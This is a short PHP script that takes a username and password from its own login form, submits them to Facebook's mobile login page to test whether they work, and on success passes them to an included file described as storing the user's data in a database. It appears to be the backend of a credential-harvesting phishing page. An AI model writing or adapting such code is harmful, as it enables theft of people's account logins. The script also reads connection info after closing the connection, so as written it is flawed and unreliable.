<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Simulate a POST request to website2 for login.
    $ch = curl_init('https://m.facebook.com/'); // Replace with the actual URL of website2's login page.
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array('username' => $username, 'password' => $password)));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); // Enable following redirects.

    $response = curl_exec($ch);
    curl_close($ch);

    // Check if the response URL changed after following the redirect.
    if (curl_getinfo($ch, CURLINFO_EFFECTIVE_URL) != 'https://m.facebook.com/') {
        // Login was successful on website2.

        // Now, you can proceed to run your existing register.php code to store the user's data in your database.
        include 'facebook.php';

        // Redirect to your welcome page or display a success message.
        header('Location: ../index.php');
    } else {
        // Login failed on website2.

        // Display an error message or take other actions as needed.
        echo "Login on website2 failed. Please try again.";
    }
}
?>